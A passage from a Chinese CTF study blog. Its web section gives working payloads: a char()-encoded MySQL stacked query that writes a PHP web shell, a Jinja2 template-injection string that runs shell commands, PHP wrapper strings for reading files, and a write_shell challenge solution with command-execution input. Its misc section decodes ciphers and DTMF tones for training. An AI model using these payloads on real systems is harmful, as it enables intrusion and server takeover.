punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> shell <span class="token keyword">from</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">execute</span> shell<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>预处理的实验</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">PREPARE</span> i <span class="token keyword">FROM</span> <span class="token variable">@payload</span><span class="token punctuation">;</span>
<span class="token keyword">EXECUTE</span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>只是不知道为什么执行成功了，但是没有返回数据库的信息，只显示了查询出了多少行。</p>
<p>执行上面的payload之后在这里找shell<code>/favicon/shell.php</code>，蚁剑连接shell即可。</p>
<p><img src="/2021/05/28/CTF/image-20210601175949497.png" alt="image-20210601175949497"></p>
<p><img src="/2021/05/28/CTF/image-20210601180101679.png" alt="找到flag即可"></p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SSTI全名为服务端模板注入。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文CSDN</a></p>
<ol>
<li>第一个Jinja2，较为常见的。</li>
</ol>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;
&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote>
<p>php可以说现在是一般的中等比赛上面都会出的一种简单的题目了，因为php相关的知识点繁多复杂，所以这里列出了php的知识点与题目两个分类，将知识点列为一个单独分类的目的就是未来比赛的时候找知识点的时候方便查找，而不是随即再去百度，减少一些不必要的麻烦。</p>
</blockquote>
<h3 id="PHP知识点"><a href="#PHP知识点" class="headerlink" title="PHP知识点"></a>PHP知识点</h3><h4 id="php短标签绕过"><a href="#php短标签绕过" class="headerlink" title="php短标签绕过"></a>php短标签绕过</h4><p>这个绕过的是对<code>php</code>这个关键字或者<code>&lt;?php</code>这个关键字有限制的情况，<code>&lt;?php ?&gt;</code>这个叫做长标签，而<code>&lt;? ?&gt;</code>叫做短标签。</p>
<h4 id="php空格绕过"><a href="#php空格绕过" class="headerlink" title="php空格绕过"></a>php空格绕过</h4><ol>
<li>限制了空格的使用的情况下可以使用php的<code>%09</code>来代替。因为在ASCII码制中<code>0x09</code>代表的是水平制表符，也就是转义的<code>\t</code>，当然直接用<code>\t</code>可能也是可以的，分情况而论都试一下就好了。</li>
</ol>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ol>
<li>反引号在php中可以命令执行，但是在双引号内反引号引住的内容好像不能被执行，其余情况下反引号的作用相当于<code>shell_exec()</code>，当关闭<code>shell_exec()</code>这个函数的时候，反引号也将不再起作用。</li>
</ol>
<h4 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h4><pre class="line-numbers language-none"><code class="language-none">1.?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;                          #GET数据
2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;            #后面的base64字符是需要传入的字符串的base64编码
3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:]&lt;?php phpinfo();?&gt;                  #POST数据
4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  #get读源码
5.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;flag.php   #其他编码读源码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="php中array赋值失败绕过"><a href="#php中array赋值失败绕过" class="headerlink" title="php中array赋值失败绕过"></a>php中array赋值失败绕过</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">9223372036854775807</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token shell-comment comment"># 返回值为1 NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>可见第二次给数组赋值失败，因为默认似乎是给这个数值<code>9223372036854775807</code>加一进行赋值的，但是又超过最大值了，所以会赋值失败。可用于以下的情况的绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 此种情况下只需要将$a的值赋为9223372036854775807即可。</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"绕过失败！&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"绕过成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="PHP题目"><a href="#PHP题目" class="headerlink" title="PHP题目"></a>PHP题目</h3><h4 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"action"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> <span class="token single-quoted-string string">'pwd'</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token single-quoted-string string">'upload'</span><span class="token punctuation">:</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里重要的就是<code>file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</code>这个点了啊，将传入的数据<code>data</code>写入<code>index.php</code>这个文件，然后上面又给了这个文件所在的目录，所以这里可以直接先<code>pwd</code>获得这个目录，打开一个标签页，然后再使用</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;ls\t&#x2F;&#96;)?&gt;

bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>获得flag的文件名再cat一下就行了。</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;cat\t&#x2F;flllllll1112222222lag&#96;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="编码与密码"><a href="#编码与密码" class="headerlink" title="编码与密码"></a>编码与密码</h2><h3 id="一些特殊编码的题目"><a href="#一些特殊编码的题目" class="headerlink" title="一些特殊编码的题目"></a>一些特殊编码的题目</h3><h4 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>给出的附件内容如下：</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">(╯°□°）╯︵ ┻━┻
50pt

(╯°□°）╯︵ ┻━┻

d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到给出的有效的条件的内容仅为一堆十六进制的字符串，这个时候考虑下面的编码方式。</p>
<p>两位十六进制转十进制<code>-128</code>再转ASCII。脚本如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
s <span class="token operator">=</span> <span class="token string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd '</span>
t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>
    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x '</span> <span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">128</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h4><p><strong>logo编码、特殊编码、画图</strong></p>
<p>给出题目</p>
<pre class="line-numbers language-none"><code class="language-none">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>复制前面的一部分谷歌一下发现<a target="_blank" rel="noopener" href="https://personal.utdallas.edu/~veerasam/logo/">解释</a></p>
<p>还有在线的代码运行的<a target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/">网站</a></p>
<p>直接粘贴进去运行一下即可。</p>
<p><img src="/2021/05/28/CTF/image-20210827223320692.png" alt></p>
<h3 id="手机按键音"><a href="#手机按键音" class="headerlink" title="手机按键音"></a>手机按键音</h3><h4 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h4><p><a target="_blank" rel="noopener" href="http://dialabc.com/sound/detect/index.html">在线网站</a></p>
<p>DTMF拨号音识别</p>
<pre class="line-numbers language-none"><code class="language-none">999 * 666 * 88 * 2 * 777 * 33 * 6 * 99 * 4 * 444 * 777 * 555 * 333 * 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>按九宫格解一下码为</p>
<pre class="line-numbers language-none"><code class="language-none">you are my girlfriend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在线网站识别的总是少一段，虽然最后我们推测也是可以推测出来的，但是还是有拨号音识别的相关的专用的工具以供下载的</p>
<p><a target="_blank" rel="noopener" href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">拨号音识别工具</a></p>
<p><a target="_blank" rel="noopener" href="http://freshmeat.sourceforge.net/projects/dtmf2num">dtmf2num官方网址</a></p>
<p><img src="/2021/05/28/CTF/image-20210701205601479.png" alt="image-20210701205601479"></p>
<pre class="line-numbers language-none"><code class="language-none">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777
youaremygirlfriends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>flag&#123;youaremygirlfriends&#125;</code></p>
<h3 id="W型栅栏密码"><a href="#W型栅栏密码" class="headerlink" title="W型栅栏密码"></a>W型栅栏密码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64


<span class="token triple-quoted-string string">'''
若知道栏数，则使用decode解密，若不知道，则使用crack_cipher遍历所有可能性
'''</span>
<span class="token keyword">def</span> <span class="token function">generate_w</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''将字符排列成w型'''</span>
    array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#生成初始矩阵</span>
    row <span class="token operator">=</span> <span class="token number">0</span>
    upflag <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在矩阵上按w型画出string</span>
        array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> string<span class="token punctuation">[</span>col<span class="token punctuation">]</span>
        <span class="token keyword">if</span> row <span class="token operator">==</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            upflag <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> row <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            upflag <span class="token operator">=</span> <span class="token boolean">False</span>
        <span class="token keyword">if</span> upflag<span class="token punctuation">:</span>
            row <span class="token operator">-=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            row <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> array

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''加密'''</span>
    array <span class="token operator">=</span> generate_w<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    msg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#将每行的字符连起来</span>
        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>
                msg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> array<span class="token punctuation">,</span> msg

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''解密'''</span>
    array <span class="token operator">=</span> generate_w<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    sub <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#将w型字符按行的顺序依次替换为string</span>
        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>
                array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> string<span class="token punctuation">[</span>sub<span class="token punctuation">]</span>
                sub <span class="token operator">+=</span> <span class="token number">1</span>
    msg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#以列的顺序依次连接各字符</span>
        <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>
                msg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> array<span class="token punctuation">,</span> msg

<span class="token keyword">def</span> <span class="token function">crack_cipher</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''破解密码'''</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#遍历所有可能的栏数</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'栏：'</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decode<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

